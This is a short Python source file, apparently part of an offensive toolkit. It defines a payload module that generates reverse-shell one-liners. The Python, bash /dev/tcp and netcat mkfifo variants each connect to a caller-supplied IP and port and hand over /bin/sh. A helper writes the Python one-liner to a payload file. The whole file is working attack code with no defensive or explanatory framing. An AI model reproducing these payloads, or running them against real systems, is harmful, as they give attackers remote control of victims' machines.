from ..system import SystemControl

class PayloadModule:
    """
    Handles Payload Generation (Reverse Shells, etc).
    """
    def __init__(self, system_control):
        self.system = system_control

    def generate_reverse_shell(self, ip, port, language="python"):
        """
        Returns a one-liner reverse shell.
        """
        if language == "python":
            return f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        elif language == "bash":
            return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        elif language == "netcat":
            return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
        
        return None

    def create_payload_file(self, ip, port, filename="payload.py"):
        content = self.generate_reverse_shell(ip, port, "python")
        if content:
             return self.system.write_file(filename, content)
        return False, "Failed to generate payload"
